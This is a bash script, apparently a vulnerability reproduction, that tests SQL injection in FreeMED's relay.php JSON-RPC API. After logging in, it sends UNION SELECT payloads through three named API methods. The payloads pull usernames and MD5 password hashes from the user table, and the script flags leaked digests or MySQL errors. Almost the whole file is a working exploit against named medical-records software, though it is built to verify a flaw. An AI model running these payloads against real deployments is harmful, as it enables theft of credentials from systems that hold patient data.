#!/usr/bin/env bash
# Hostile repro: SQL injection through relay.php's JSON-RPC surface
#
# relay.php only checks that a user is logged in; the API methods below
# concatenate user input into SQL. The injected payload does not try to change
# the query shape - it appends a UNION SELECT that hands back
# user.username / user.userpassword (an MD5 digest), which the response should
# never be able to contain.
#
# Usage:
#   BASE=http://localhost:38081 FREEMED_TEST_USER=admin FREEMED_TEST_PW=... \
#     ./repro-relay-sqli.sh
#
# Environment (no credential is ever hardcoded):
#   BASE              base URL of the FreeMED deployment (default http://localhost:38081)
#   FREEMED_TEST_USER relay login user (default "admin" - a username, not a secret)
#   FREEMED_TEST_PW   relay login password (default empty)
#   TIMEOUT           per-request curl timeout in seconds (default 20)
#
# The cookie jar lives in TMPDIR and is removed on exit; the password is only
# ever passed on the command line, never written to a file.
#
# Exit codes:
#   0  all payloads answered and none leaked anything
#   1  EXPLOITED - MD5 digest, MySQL error text, or a row the payload should not
#      be able to select came back
#   2  inconclusive - login failed, or a request got no response at all
set -u

BASE="${BASE:-http://localhost:38081}"
FREEMED_TEST_USER="${FREEMED_TEST_USER:-admin}"
FREEMED_TEST_PW="${FREEMED_TEST_PW:-}"
TIMEOUT="${TIMEOUT:-20}"

TMPDIR="${TMPDIR:-/tmp}"
JAR="$(mktemp "${TMPDIR%/}/freemed-relay-cookies.XXXXXX" 2>/dev/null)" ||
  JAR="${TMPDIR%/}/freemed-relay-cookies.$$"
OUT="$(mktemp "${TMPDIR%/}/freemed-relay-body.XXXXXX" 2>/dev/null)" ||
  OUT="${TMPDIR%/}/freemed-relay-body.$$"
cleanup() { rm -f "$JAR" "$OUT"; }
trap cleanup EXIT INT TERM HUP

# JSON escape for a string value (backslash then double quote are the only
# characters that matter for the payloads used here).
json_escape() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  printf '%s' "$s"
}

# Response markers. A 32-hex digest is the userpassword column; the MySQL
# strings are error text echoed to the client; `"root"`/`"administrator"` are
# rows the payload's search term ("a") must not be able to select.
MD5_RE='[0-9a-f]{32}'
SQLERR_RE='SQL syntax|check the manual that corresponds|mysql_(query|fetch|connect)|Warning: mysqli?|You have an error'
UNEXPECTED_RE='"(root|administrator)"|"Root"'

exploited=0
unreachable=0
probes=0

post() {
  local label="$1" body="$2"
  : >"$OUT"
  probes=$((probes + 1))
  local code
  code="$(curl -s --max-time "$TIMEOUT" -o "$OUT" -w '%{http_code}' \
    -b "$JAR" -c "$JAR" \
    -H 'Content-Type: application/json' \
    --data-binary "$body" \
    "$BASE/relay.php/json")"

  printf -- '--- %s\n' "$label"
  printf '    HTTP %s  bytes=%s\n' "${code:-000}" "$(wc -c <"$OUT" | tr -d ' ')"
  printf '    head: %s\n' "$(head -c 200 "$OUT" | tr '\n\r' '  ')"

  if [ -z "$code" ] || [ "$code" = "000" ]; then
    unreachable=$((unreachable + 1))
    printf '    >>> NO RESPONSE: connection to %s failed\n' "$BASE"
    return 0
  fi

  local matched=0
  if grep -qE "$MD5_RE" "$OUT"; then
    matched=1
    printf '    >>> EXPLOITED: 32-hex MD5 digest in response (user.userpassword leaked; value not echoed)\n'
  fi
  if grep -qE "$SQLERR_RE" "$OUT"; then
    matched=1
    printf '    >>> EXPLOITED: MySQL error text returned to the client\n'
  fi
  if grep -qE "$UNEXPECTED_RE" "$OUT"; then
    matched=1
    printf '    >>> EXPLOITED: row the payload must not be able to select (root/administrator) returned\n'
  fi
  [ "$matched" -eq 1 ] && exploited=$((exploited + 1))
  return 0
}

printf 'repro: relay.php JSON-RPC SQL injection\n'
printf 'base=%s  user=%s  pw=%s\n\n' "$BASE" "$FREEMED_TEST_USER" \
  "$([ -n "$FREEMED_TEST_PW" ] && printf '<set>' || printf '<empty>')"

# 1. Log in first so every following call is an authenticated injection, not an
#    authentication failure. /relay.php/json is the JSON transport.
printf '== login ==\n'
: >"$OUT"
login_code="$(curl -s --max-time "$TIMEOUT" -o "$OUT" -w '%{http_code}' \
  -b "$JAR" -c "$JAR" \
  -H 'Content-Type: application/json' \
  --data-binary "$(printf '{"method":"org.freemedsoftware.public.Login.Validate","params":["%s","%s"]}' \
    "$(json_escape "$FREEMED_TEST_USER")" "$(json_escape "$FREEMED_TEST_PW")")" \
  "$BASE/relay.php/json")"
printf '    HTTP %s  head: %s\n' "${login_code:-000}" "$(head -c 200 "$OUT" | tr '\n\r' '  ')"
login_ok=0
[ -n "$login_code" ] && [ "$login_code" != "000" ] || unreachable=$((unreachable + 1))
if grep -qiE '(true|"id"[[:space:]]*:)' "$OUT"; then
  login_ok=1
  printf '    login accepted, session cookie stored in the jar\n'
else
  printf '    >>> WARNING: login did not look successful; any "clean" result below is meaningless\n'
fi
printf '\n'

INJ2="x' UNION SELECT username,userpassword FROM user-- -"
INJ4="x' UNION SELECT username,userpassword,username,userpassword FROM user-- -"

# 2. UserInterface::GetUsers($param, $usertype) - $usertype is concatenated raw.
post "org.freemedsoftware.api.UserInterface.GetUsers (usertype injection)" \
  "$(printf '{"method":"org.freemedsoftware.api.UserInterface.GetUsers","params":["a","%s"]}' "$(json_escape "$INJ2")")"

# 3. ModuleSearch::picklist($keyword, $moduleType) - $moduleType is concatenated raw.
post "org.freemedsoftware.api.ModuleSearch.picklist (moduleType injection)" \
  "$(printf '{"method":"org.freemedsoftware.api.ModuleSearch.picklist","params":["a","%s"]}' "$(json_escape "$INJ2")")"

# 4. EncounterNotesTemplate::getTemplates($type) - $type is concatenated raw.
post "org.freemedsoftware.module.EncounterNotesTemplate.getTemplates (type injection)" \
  "$(printf '{"method":"org.freemedsoftware.module.EncounterNotesTemplate.getTemplates","params":["%s"]}' "$(json_escape "$INJ4")")"

printf '\n%d request(s) sent, %d vulnerable response(s), %d unreachable\n' \
  "$probes" "$exploited" "$unreachable"

if [ "$exploited" -gt 0 ]; then
  printf '>>> RESULT: EXPLOITED - %d relay response(s) leaked data or errors\n' "$exploited"
  exit 1
fi
if [ "$unreachable" -gt 0 ] || [ "$login_ok" -ne 1 ]; then
  printf '>>> RESULT: INCONCLUSIVE - could not authenticate/probe %s, so nothing was proven\n' "$BASE"
  exit 2
fi
printf '>>> RESULT: not vulnerable - no digest, error text or unexpected rows returned\n'
exit 0
